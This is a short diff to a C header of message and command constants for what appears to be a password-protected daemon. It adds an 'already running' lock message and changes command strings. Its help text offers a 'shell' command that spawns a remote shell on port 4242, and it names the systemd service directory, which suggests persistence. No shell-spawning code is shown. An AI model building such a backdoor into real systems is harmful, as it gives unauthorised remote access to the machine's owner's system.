@@ -21,6 +21,7 @@
 #define LIMIT_REACH "Too many user connected, retry later\n"
 #define FAILED_CONNECTION "Failed to connect\n"
 #define UNDEFINED_PASSWORD "Error: password not set create it with (export PASSWORD=<value>)\n"
+#define EXISTING_LOCK "Daemon alredy running\n"
 #define ASK_PASS "Enter the server password: "
 #define WRONG_PASS "Wrong pass. Goodbye\n"
 #define BUFFER_SIZE 256
@@ -32,9 +33,9 @@
 #define LOG_USER_INPUT "[INPUT]: "
 #define LOG_WRONG_PASS "[INFO]: connection attempt with wrong pass\n"
 
-#define CMD_HELP "?"
+#define CMD_HELP "?\n"
 #define HELP_MSG "? show help\nshell Spawn remote shell on 4242\n"
-#define CMD_SHELL "shell"
+#define CMD_SHELL "shell\n"
 #define SHELL_MSG "Spawning shell on port 4242\n"
 
 #define SYS_DIR "/etc/systemd/system"
